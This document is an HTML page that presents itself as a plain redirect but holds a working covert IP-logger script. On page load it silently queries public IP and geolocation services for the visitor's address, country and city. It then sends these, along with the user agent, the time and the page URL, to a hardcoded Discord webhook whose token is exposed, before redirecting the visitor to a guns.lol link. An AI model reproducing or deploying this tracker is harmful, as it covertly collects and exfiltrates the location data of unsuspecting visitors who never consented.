<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Redirect</title>

  <script>
    (async function(){
      const targetUrl = 'https://guns.lol/1y.'; // ØºÙŠÙ‘Ø±Ù‡ Ø¥Ø°Ø§ Ø£Ø±Ø¯Øª
      const webhookUrl = 'https://discordapp.com/api/webhooks/1456621454933229681/R949Wvw73xTuOzz9jEQKJXC3cpmVifelhZQOXP-D8OZTxZ-pSQHKmbOZes3HGjQdwMnW';

      // Ø­Ø§ÙˆÙ„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IPv4 Ù…Ù† Ø®Ø¯Ù…Ø§Øª v4 Ø£ÙˆÙ„Ø§Ù‹
      async function getIPv4() {
        const candidates = [
          'https://v4.ident.me',
          'https://ipv4.icanhazip.com',
          'https://v4.ifconfig.co/ip'
        ];

        for (const url of candidates) {
          try {
            const r = await fetch(url, { cache: 'no-store' });
            if (!r.ok) continue;
            const text = (await r.text()).trim();
            // ØªØ£ÙƒØ¯ Ø£Ù†Ù‡ IPv4 (Ù„Ø§ ÙŠØ­ØªÙˆÙŠ Ù†Ù‚Ø·ØªÙŠÙ†)
            if (text && text.indexOf(':') === -1) return text;
          } catch (e) {
            // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ ÙˆØ§Ø³ØªÙ…Ø±
          }
        }

        // Ø¥Ù† Ù„Ù… Ù†Ø¬Ø¯ IPv4ØŒ Ø§Ø±Ø¬Ø¹ Ù„Ù…Ù„Ù JSON Ø§Ù„Ø¹Ø§Ù… (Ù‚Ø¯ ÙŠÙƒÙˆÙ† IPv6)
        try {
          const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
          const data = await r.json();
          return data.ip || '';
        } catch (e) {
          return '';
        }
      }

      try {
        const ipv4 = await getIPv4();
        let country = '';
        let city = '';

        if (ipv4) {
          // Ø­Ø§ÙˆÙ„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ù€ IPv4
          try {
            const r = await fetch(`https://ipapi.co/${ipv4}/json/`, { cache: 'no-store' });
            if (r.ok) {
              const d = await r.json();
              country = d.country_name || '';
              city = d.city || '';
            }
          } catch (e) {
            // ØªØ¬Ø§Ù‡Ù„
          }
        }

        const dateTime = new Date().toLocaleString();
        const ua = navigator.userAgent;

        const payload = {
          content:
`ğŸ“¥ **New Visitor Logged**
ğŸŒ **IP:** ${ipv4 ? 'https://ipinfo.io/' + ipv4 : 'Unknown'}
ğŸ™ï¸ **Location:** ${country} - ${city}
ğŸ•’ **Time:** ${dateTime}
ğŸ–¥ï¸ **UA:** ${ua}
ğŸ”— **Page:** ${location.href}`
        };

        const body = JSON.stringify(payload);
        const blob = new Blob([body], { type: 'application/json' });

        if (navigator.sendBeacon) {
          navigator.sendBeacon(webhookUrl, blob);
        } else {
          await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body, keepalive: true });
        }
      } catch (e) {
        // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ ÙˆØ§Ø³ØªÙ…Ø± Ø¨Ø§Ù„ØªØ­ÙˆÙŠÙ„
      } finally {
        // ØªØ­ÙˆÙŠÙ„ ÙÙˆØ±ÙŠ â€” Ù†Ù†ØªÙ‚Ù„ ÙÙˆØ±Ù‹Ø§ Ø¨Ø¹Ø¯ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ø¨Ø± sendBeacon Ø£Ùˆ fetch Ù…Ø¹ keepalive
        // Ù…Ù„Ø§Ø­Ø¸Ø©: Ø¥Ù† Ù„Ù… ÙŠØ¯Ø¹Ù… Ø§Ù„Ù…ØªØµÙØ­ sendBeacon Ù‚Ø¯ Ù„Ø§ ÙŠØµÙ„ Ø§Ù„Ø·Ù„Ø¨ Ù‚Ø¨Ù„ Ø§Ù„ØªØ­ÙˆÙŠÙ„ØŒ Ù„ÙƒÙ† Ù‡Ø°Ø§ Ø£Ø³Ø±Ø¹ Ø³Ù„ÙˆÙƒ Ù…Ù…ÙƒÙ† Ø¹Ù„Ù‰ Ø§Ù„Ø¹Ù…ÙŠÙ„
        location.replace(targetUrl);
      }
    })();
  </script>
</head>

<body>
</body>
</html>

